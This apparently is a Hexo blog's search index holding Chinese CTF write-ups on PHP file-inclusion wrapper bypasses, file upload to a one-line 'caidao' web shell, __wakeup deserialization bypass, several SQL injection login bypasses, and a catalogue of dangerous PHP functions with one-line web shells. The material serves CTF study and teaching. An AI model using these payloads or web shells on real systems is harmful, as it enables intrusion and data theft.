<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>python模板注入</title>
    <link href="/2020/01/10/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2020/01/10/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">https://www.freebuf.com/column/187845.html</a></p><p>攻防世界中模板注入例题的wp:<a href="https://blog.csdn.net/qq_40884727/article/details/101605002" target="_blank" rel="noopener">https://blog.csdn.net/qq_40884727/article/details/101605002</a></p>]]></content>
    
    
    <categories>
      
      <category>WEB，python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界web进阶区Web_php_include</title>
    <link href="/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/"/>
    <url>/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h1><p><img src="/img/php1.png" srcset="/img/loading.gif" alt=""></p><p>strstr() 函数搜索字符串在另一字符串中的第一次出现。<br>注释：该函数是二进制安全的。<br>注释：该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 stristr() 函数。</p><p>那就利用大小写绕过输入：</p><blockquote><blockquote><p>?page=phP://input</p></blockquote></blockquote><p><img src="/img/php2.png" srcset="/img/loading.gif" alt=""><br>图片里我忘记打成大写了。</p><p><img src="/img/php3.png" srcset="/img/loading.gif" alt=""></p><p>直接访问flag发现一片空白。</p><p><img src="/img/php4.png" srcset="/img/loading.gif" alt=""></p><p>那就继续在burp里用cat命令访问，成功取得flag。</p><p>事后观看其他人的思路还可以用data直接查看：</p><blockquote><blockquote><p>?page=data:text/plain,<?php%20system("cat%20fl4gisisish3r3.php");?></p></blockquote></blockquote><p>或者麻烦一点用菜刀也可以做出来。</p>]]></content>
    
    
    <categories>
      
      <category>攻防世界，web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB，upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界upload1总结</title>
    <link href="/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload1%E6%80%BB%E7%BB%93/"/>
    <url>/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload1%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="攻防世界web进阶区upload1"><a href="#攻防世界web进阶区upload1" class="headerlink" title="攻防世界web进阶区upload1"></a>攻防世界web进阶区upload1</h1><p>打开题目网站，直接出现了一个上传的界面，试着直接点一个php文件进行上传。发现上传的那个按钮直接变灰，无法点击。于是又点了一个1.jpg文件。</p><blockquote><blockquote><blockquote><?php phpinfo();?></blockquote></blockquote></blockquote><p>然后上传用burp suite进行拦截直接改名为php。发现上传成功。并且页面显示上传文件后的路径，进行访问。<br>果真显示了phpinfo的界面<br><img src="/img/caidao3.png" srcset="/img/loading.gif" alt=""><br>嗯。。。。那就用菜刀进行连接，传一个一句话代码。</p><blockquote><blockquote><blockquote><?php @eval($_POST['caidao']);?></blockquote></blockquote></blockquote><p>然后打开菜刀进行连接。额。。。。失败了。<br>然后进行百度发现我传入菜刀时，忘记修改后缀名，将jpg改成php。</p><p><img src="/img/caidao2.png" srcset="/img/loading.gif" alt=""><br><img src="/img/caidai1.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>攻防世界，web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB，upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>__wakeup漏洞绕过</title>
    <link href="/2019/12/25/wakeup%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87/"/>
    <url>/2019/12/25/wakeup%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="wakeup-函数用法"><a href="#wakeup-函数用法" class="headerlink" title="__wakeup()函数用法"></a>__wakeup()函数用法</h2><p><strong>wakeup()是用在反序列化操作中。unserialize()会检查存在一个</strong>wakeup()方法。如果存在，则先会调用__wakeup()方法。</p><pre><code>&lt;?phpclass A{function __wakeup(){echo &#39;Hello&#39;;}}$c = new A();$d=unserialize(&#39;O:1:&quot;A&quot;:0:{}&#39;);?&gt;</code></pre><p>最后页面输出了Hello。在反序列化的时候存在__wakeup()函数，所以最后就会输出Hello<br>__wakeup()函数漏洞说明</p><pre><code>&lt;?phpclass Student{public $full_name = &#39;zhangsan&#39;;public $score = 150;public $grades = array();function __wakeup() {echo &quot;__wakeup is invoked&quot;;}}$s = new Student();var_dump(serialize($s));?&gt;</code></pre><p>最后页面上输出的就是Student对象的一个序列化输出，<br>O:7:”Student”:3:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}。其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br><strong>wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过</strong>wakeup的执行。<br>当我们将上述的序列化的字符串中的对象属性修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}。<br>最后执行运行的代码如下：</p><pre><code>class Student{public $full_name = &#39;zhangsan&#39;;public $score = 150;public $grades = array();function __wakeup() {echo &quot;__wakeup is invoked&quot;;}function __destruct() {var_dump($this);}}$s = new Student();$stu = unserialize(&#39;O:7:&quot;Student&quot;:5:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}&#39;);</code></pre><p>可以看到这样就成功地绕过了__wakeup()函数。</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入(一）</title>
    <link href="/2019/12/22/SQL%E6%B3%A8%E5%85%A5(%E4%B8%80)/"/>
    <url>/2019/12/22/SQL%E6%B3%A8%E5%85%A5(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h2 id="万能密码—very-easy"><a href="#万能密码—very-easy" class="headerlink" title="万能密码—very easy"></a>万能密码—very easy</h2><p>题目入口：<a href="http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php</a> </p><p>题目来源：hacking lab inject 01~</p><p><img src="/img/1.jpg" srcset="/img/loading.gif" alt=""></p><p>源代码有提示：</p><blockquote><p>&lt;!--ps login as admin–&gt;</p></blockquote><p>万能密码登录语句构造： </p><p>select * from admin where username=’admin’and 1=1 #’ and password=’123456′ </p><p>OR </p><p>select * from admin where username=’admin’or 1 #’ and password=’123456′ </p><p>或者不需要admin </p><p>select * from admin where username=’1′or 1 or 1 #’ and password=’123456′ </p><p>还可以用#来注释 </p><p>select * from admin where username=’admin’#’ and password=’123456′</p><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>题目入口：<a href="http://redtiger.labs.overthewire.org/level2.php" target="_blank" rel="noopener">http://redtiger.labs.overthewire.org/level2.php</a> </p><p>题目来源：RedTigers Hackit Level 2 Simple login-bypass </p><p>做题密码：4_is_not_random </p><p>构造语句： </p><p>username=1&amp;password=1′or’1′or’1&amp;login=Login</p><p> pass.png</p><h2 id="万能密码–-not-easy"><a href="#万能密码–-not-easy" class="headerlink" title="万能密码– not easy"></a>万能密码– not easy</h2><p>题目入口： <a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a> </p><p>题目来源：实验吧，不要怀疑,我已经过滤了一切,还再逼你注入,哈哈哈哈哈!</p><p>常规方式使用万能密码，发现’没有被过滤，or，–+，#被过滤。</p><p><img src="/img/2.jpg" srcset="/img/loading.gif" alt=""></p><p>假设后台sql查询语句为： </p><p>select * from user where username=’$user’ and password=’$pass’ </p><p>构造payload： </p><p>username=reborn’=’&amp;password=reborn’=’</p><p> <img src="/img/3.jpg" srcset="/img/loading.gif" alt=""></p><pre><code>select * from user where username=’reborn’=” and password=’reborn’=”</code></pre><p>username=’reborn’返回值为0，相当于false，然后0=”的结果为1，相当于true。 </p><p>所以注入语句相当于：</p><pre><code>select * from user where 1 and 1</code></pre><h2 id="万能密码—-little-hard"><a href="#万能密码—-little-hard" class="headerlink" title="万能密码— little hard ?"></a>万能密码— little hard ?</h2><p>题目入口：<a href="http://123.59.52.228:1515/route.php?act=index" target="_blank" rel="noopener">http://123.59.52.228:1515/route.php?act=index</a> </p><p>题目来源：2017年全国大学生信息安全竞赛的web题。</p><p><img src="/img/4.jpg" srcset="/img/loading.gif" alt=""></p><p>提交的时候，返回包有提示这么一个sql语句： </p><pre><code>select count(*) from t_info where username = ’1′ or nickname = ’1′ </code></pre><p>‘ 转义 \ </p><p>\ 转义 \ </p><p>” 转义 \” </p><p>空格被过滤：但’可以转义掉原本的’ </p><pre><code>name=or 1 #’&amp;submit=check select count(*) from t_info where username = ‘or1#\’ or nickname = ‘or1#\’ </code></pre><p>用%09代替空格，%09是制表符的URL编码 </p><pre><code>name=or%091%09#’&amp;submit=check select count(*) from t_info where username = ‘or 1 #\’ or nickname = ‘or 1 #\’good job </code></pre><p>跟随302跳转。</p><h2 id="万能密码—-md5-pass-true"><a href="#万能密码—-md5-pass-true" class="headerlink" title="万能密码— md5($pass,true)"></a>万能密码— md5($pass,true)</h2><p>题目入口：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a> </p><p>题目来源：jarvis oj，Login：需要密码才能获得flag哦。</p><p>本题是一个登录页面。</p><p><img src="/img/5.jpg" srcset="/img/loading.gif" alt=""></p><p>通过burp抓包拦截，返回包有提示：</p><p> tishi.png</p><pre><code>Hint: “select * from `admin` where password=’”.md5($pass,true).”‘”</code></pre><ul><li>md5(string,raw)* </li></ul><p>string 必需。规定要计算的字符串。 </p><p>raw 可选。规定十六进制或二进制输出格式： </p><p>•  TRUE – 原始 16 字符二进制格式</p><p>•  FALSE – 默认。32 字符十六进制数如果md5计算后的值经过hex转成字符串后为 ”or’xxx’这样的字符串，则拼接后构成的语句为：</p><pre><code>select * from `admin` where password=”or’xxx’</code></pre><p>下面提供两个payload： </p><p>content: 129581926211651571912466741651878684928 </p><p>hex: 06da5430449f8f6f23dfc1276f722738 </p><p>raw: ?T0D??o#??’or’8.N=?</p><p>content: ffifdyop </p><p>hex: 276f722736c95d99e921722cf9ed621c </p><p>raw: ‘or’6蒥欓!r,b </p><p>类似题目： </p><p>题目入口：<a href="http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/" target="_blank" rel="noopener">http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/</a> </p><p>题目来源：hacking lab inject 09~ </p><pre><code>看到源代码password=’”.md5($_GET[&#39;pwd&#39;], true)，就知道这道题和题目3的解法是一致的。 http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/?userid=1&amp;pwd=ffifdyop</code></pre><h2 id="万能密码—-with-rollup"><a href="#万能密码—-with-rollup" class="headerlink" title="万能密码— with rollup"></a>万能密码— with rollup</h2><p>题目入口： <a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/index.php</a> </p><p>题目来源：实验吧 </p><p>访问链接是登录页面：</p><p><img src="/img/6.jpg" srcset="/img/loading.gif" alt=""></p><p>查看网页源代码有提示：</p><p><img src="/img/7.jpg" srcset="/img/loading.gif" alt=""></p><p>访问：<a href="http://ctf5.shiyanbar.com/web/pcat/source.txt" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/source.txt</a> 得到题目源代码：</p><pre><code>&lt;?phperror_reporting(0);if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) {    echo ‘&lt;form action=”&quot; method=”post”&gt;’.”&lt;br/&gt;”;    echo ‘&lt;input name=”uname” type=”text”/&gt;’.”&lt;br/&gt;”;    echo ‘&lt;input name=”pwd” type=”text”/&gt;’.”&lt;br/&gt;”;    echo ‘&lt;input type=”submit” /&gt;’.”&lt;br/&gt;”;    echo ‘&lt;/form&gt;’.”&lt;br/&gt;”;    echo ‘&lt;!–source: source.txt–&gt;’.”&lt;br/&gt;”;    die;}function AttackFilter($StrKey,$StrValue,$ArrReq){      if (is_array($StrValue)){        $StrValue=implode($StrValue);    }    if (preg_match(“/”.$ArrReq.”/is”,$StrValue)==1){           print “水可载舟，亦可赛艇！”;        exit();    }}$filter = “and|select|from|where|union|join|sleep|benchmark|,|\(|\)”;foreach($_POST as $key=&gt;$value){     AttackFilter($key,$value,$filter);}$con = mysql_connect(“XXXXXX”,”XXXXXX”,”XXXXXX”);if (!$con){    die(‘Could not connect: ‘ . mysql_error());}$db=”XXXXXX”;mysql_select_db($db, $con);$sql=”SELECT * FROM interest WHERE uname = ‘{$_POST[&#39;uname&#39;]}’”;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) {     $key = mysql_fetch_array($query);    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {        print “CTF{XXXXXX}”;    }else{        print “亦可赛艇！”;    }}else{    print “一颗赛艇！”;}mysql_close($con);?&gt;</code></pre><p>从源代码得出，注入点在uname这个位置上，$filter没有过滤掉 or </p><p>注入成功要满足几个条件：</p><ol><li><p>mysql_num_rows($query) == 1 即查询返回的结果行数为1</p></li><li><p>$key[‘pwd’] == $_POST[‘pwd’] 即查询返回的结果与POST发送的pwd值相同</p></li></ol><p>解题： </p><p>group by pass with rollup 的技巧</p><pre><code>mysql&gt; select user from users group by user;+———+| user    |+———+| 1337    || admin   || gordonb || pablo   || smithy  |+———+5 rows in setmysql&gt; select user from users group by user with rollup;+———+| user    |+———+| 1337    || admin   || gordonb || pablo   || smithy  || NULL    |+———+6 rows in set</code></pre><p>可以发现，在加上with rollup之后，返回pass最后一行多了一个NULL。当我们POST的pass为空，即可满足$key[‘pwd’] == $_POST[‘pwd’]条件。</p><p>如何让返回的结果只取最后一行呢？ </p><p>因为过滤了,所以无法使用limit 5,1这样的语法 </p><p>可以使用limit 1 offset 5</p><p>mysql&gt; select user from users group by 1 with rollup limit 1 offset 5;</p><p>+——+</p><p>| user |</p><p>+——+</p><p>| NULL |</p><p>+——+</p><p>1 row in set</p><p>所以最终 payload 如下，2为遍历出来的值 。</p><p>uname=’ or 1=1 group by pwd with rollup limit 1 offset 2#&amp;pwd=</p><h2 id="万能密码—-程序逻辑"><a href="#万能密码—-程序逻辑" class="headerlink" title="万能密码— 程序逻辑"></a>万能密码— 程序逻辑</h2><p>题目入口： <a href="http://ctf5.shiyanbar.com/web/5/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/5/index.php</a> </p><p>题目来源：实验吧，程序逻辑问题 </p><p>本题源代码：<a href="http://ctf5.shiyanbar.com/web/5/index.txt" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/5/index.txt</a></p><pre><code>&lt;html&gt;&lt;head&gt;welcome to simplexue&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) {    $conn = mysql_connect(“********, “*****”, “********”);    mysql_select_db(“phpformysql”) or die(“Could not select database”);    if ($conn-&gt;connect_error) {        die(“Connection failed: ” . mysql_error($conn));} $user = $_POST[user];$pass = md5($_POST[pass]);$sql = “select pw from php where user=’$user’”;$query = mysql_query($sql);if (!$query) {    printf(“Error: %s\n”, mysql_error($conn));    exit();}</code></pre><p>$row = mysql_fetch_array($query, MYSQL_ASSOC);</p><pre><code>//echo $row[&quot;pw&quot;];  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {    echo “&lt;p&gt;Logged in! Key:************** &lt;/p&gt;”;}else {    echo(“&lt;p&gt;Log in failure!&lt;/p&gt;”);  }}?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value=”Username”&gt;&lt;input type=password name=pass value=”Password”&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href=”index.txt”&gt;&lt;/html&gt;</code></pre><p>首先可以发现user处存在注入点，并且会回显错误信息，第一个想到的是报错注入。</p><pre><code>user=admin’and (extractvalue(1,concat(0x7e,(select pw from php where user =’admin’ limit 0,1),0x7e)))#&amp;pass=111</code></pre><p>结果密码并不是admin/111</p><pre><code>user=admin’and (extractvalue(1,concat(0x7e,(select pw from phpformysql.php limit 0,1),0x7e)))#&amp;pass=111</code></pre><p>结果提示：</p><p><img src="/img/8.jpg" srcset="/img/loading.gif" alt=""></p><p>既然是程序逻辑漏洞，然就继续看代码吧。</p><pre><code>if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {    echo “&lt;p&gt;Logged in! Key:************** &lt;/p&gt;”;}</code></pre><p>判断sql查询返回的值和$pass做比较。strcasecmp比较两个字符串，且不区分大小写，相等返回0。 </p><p>既然user存在注入，我们可以让返回的结果为任何值，只要等于我们输入pass的md5值。 </p><p>如：reborn的md5加密的值为5ce3c6e5c3f84bdc0f45148adfd16ae6 </p><p>因此我们可以构造payload： </p><p>user=’union select ’5ce3c6e5c3f84bdc0f45148adfd16ae6′#&amp;pass=reborn </p><p>结果：<br><img src="/img/9.jpg" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jarvis OJ admin</title>
    <link href="/2019/12/22/Jarvis-OJ-admin/"/>
    <url>/2019/12/22/Jarvis-OJ-admin/</url>
    
    <content type="html"><![CDATA[<h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><hr><p>题目链接：http ://web.jarvisoj.com:32792 /</p><p>点开页面后是一个hello world，看了看F12什么都没发现，用bp也没发现什么东西。用御剑先扫一波，马上发现了robots.txt。</p><a id="more"></a><p>进去后出现了：</p><blockquote><p>Disallow: /admin_s3cr3t.php</p></blockquote><p>激动的点开了网站</p><p><img src="/img/1.png" srcset="/img/loading.gif" alt=""></p><p>提交以后发现是错的。<br>再次进入网站用bp拦截，发现cookie的值是</p><blockquote><p>admin = 0</p></blockquote><p>将0改成1.出现flag。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web，JARvis OJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码漏洞（一）</title>
    <link href="/2019/12/22/PHP%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2019/12/22/PHP%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><h2 id="php代码执行相关"><a href="#php代码执行相关" class="headerlink" title="php代码执行相关"></a>php代码执行相关</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>mixed eval ( string $code )<br>把字符串code作为php代码执行。常见的一句话木马：</p><a id="more"></a><p>（<code>)&lt;?php    eval($_GET[&#39;pass&#39;])?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://xxx/codeexec.php?pass=phpinfo()" target="_blank" rel="noopener">http://xxx/codeexec.php?pass=phpinfo()</a>;</p></blockquote><p>得到phpinfo()页面。</p><h2 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h2><p>PHP 5</p><p>bool assert ( mixed $assertion [, string $description ] )<br>PHP 7</p><p>bool assert ( mixed $assertion [, Throwable $exception ] )<br>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p><p>一句话木马：<br>(<code>)&lt;?php    assert($_GET[&#39;pass&#39;]);?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://xxx/codeexec.php?pass=phpinfo()" target="_blank" rel="noopener">http://xxx/codeexec.php?pass=phpinfo()</a></p></blockquote><p>phpinfo()后可以不用分号。得到phpinfo()页面。</p><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h2><p>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )<br>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串<br>更详细的说明见：php-preg_replace</p><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )<br>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。<br>(<code>)&lt;?php    call_user_func($_GET[&#39;chybeta&#39;],$_GET[&#39;ph0en1x&#39;]);?&gt;(</code>)</p><p>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo()" target="_blank" rel="noopener">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo()</a></p></blockquote><h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h2><p>mixed call_user_func_array ( callable $callback , array $param_arr )<br>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。<br>(<code>)&lt;?php    call_user_func_array($_GET[&#39;chybeta&#39;],$_GET[&#39;ph0en1x&#39;]);?&gt;(</code>)</p><p>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo()" target="_blank" rel="noopener">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo()</a></p></blockquote><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p>string create_function ( string $args , string $code )<br>该函数的内部实现用到了eval，所以也具有相同的安全问题。第一个参数args是后面定义函数的参数，第二个参数是函数的代码。<br>(<code>)&lt;?php    $a = $_GET[&#39;chybeta&#39;];    $b = create_function(&#39;$a&#39;,&quot;echo $a&quot;);    $b(&#39;&#39;);?&gt;(</code>)</p><p>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php" target="_blank" rel="noopener">http://localhost:2500/codeexec.php</a><br>?chybeta=phpinfo();</p></blockquote><p>##array_map()<br>array array_map ( callable $callback , array $array1 [, array $… ] )<br>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。<br>(<code>)&lt;?php    $array = array(0,1,2,3,4,5);    array_map($_GET[&#39;chybeta&#39;],$array);?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php" target="_blank" rel="noopener">http://localhost:2500/codeexec.php</a><br>?chybeta=phpinfo</p></blockquote><p>注意没有括号()和分号;。</p><h1 id="系统命令执行相关"><a href="#系统命令执行相关" class="headerlink" title="系统命令执行相关"></a>系统命令执行相关</h1><h2 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h2><p>string system ( string $command [, int &amp;$return_var ] )<br>command是要执行的命令。return_var，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。<br>(<code>)&lt;?php    system(&quot;whoami&quot;);?&gt;(</code>)<br>会看到运行了shell命令，并打印回显到页面上。</p><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h2><p>void passthru ( string $command [, int &amp;$return_var ] )<br>command是要执行的命令。return_var，如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。<br>(<code>)&lt;?php    passthru(&quot;whoami&quot;);?&gt;(</code>)</p><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><p>string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )<br>exec() 执行 command 参数所指定的命令。 其余参数，见文档<br>(<code>)&lt;?php    echo exec(&quot;whoami&quot;);?&gt;(</code>)</p><h2 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h2><p>void pcntl_exec ( string $path [, array $args [, array $envs ]] )<br>path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本<br>args是一个要传递给程序的参数的字符串数组。<br>(<code>)&lt;?php    pcntl_exec ( &quot;/bin/bash&quot; , array(&quot;whoami&quot;));?&gt;(</code>)</p><h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h2><p>string shell_exec ( string $cmd )<br>cmd是要执行的命令。<br>(<code>)&lt;?php    echo shell_exec(&quot;whoami&quot;);?&gt;(</code>)</p><h2 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h2><p>resource popen ( string $command , string $mode )<br>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 后面的mode，当为 ‘r’，返回的文件指针等于命令的 STDOUT，当为 ‘w’，返回的文件指针等于命令的 STDIN。<br>(<code>)&lt;?php$handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;);?&gt;(</code>)</p><h2 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h2><p>resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )<br>cmd是要执行的命令，其余见文档</p><p><code>(反单引号)在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“</code>”的效果与函数 shell_exec() 相同。<br>(<code>)&lt;?php    echo `whoami`;?&gt;(</code>)<br>##ob_start()<br>bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )<br>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。</p><p>可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被( ob_flush(), ob_clean() 或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用 output_callback 时，它将收到输出缓冲区的内容作为参数 并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。</p><p>下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(cmd)中的cmd，把我们输入的_GET[a]作为cmd的参数。<br>(<code>)&lt;?php    $cmd = &#39;system&#39;;    ob_start($cmd);    echo &quot;$_GET[a]&quot;;    ob_end_flush();?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php?a=whoami" target="_blank" rel="noopener">http://localhost:2500/codeexec.php?a=whoami</a></p></blockquote><h2 id="php-mail"><a href="#php-mail" class="headerlink" title="php mail()"></a>php mail()</h2><p>mail 文档<br>(<code>)bool mail (    string $to ,    string $subject ,    string $message [,    string $additional_headers [,    string $additional_parameters ]])(</code>)<br>要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项：</p><p>配置SMTP服务器的主机名和端口<br>配置PHP用作邮件传输代理（MTA）的文件路径<br>当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆叠注入</title>
    <link href="/2019/12/21/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/12/21/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
    
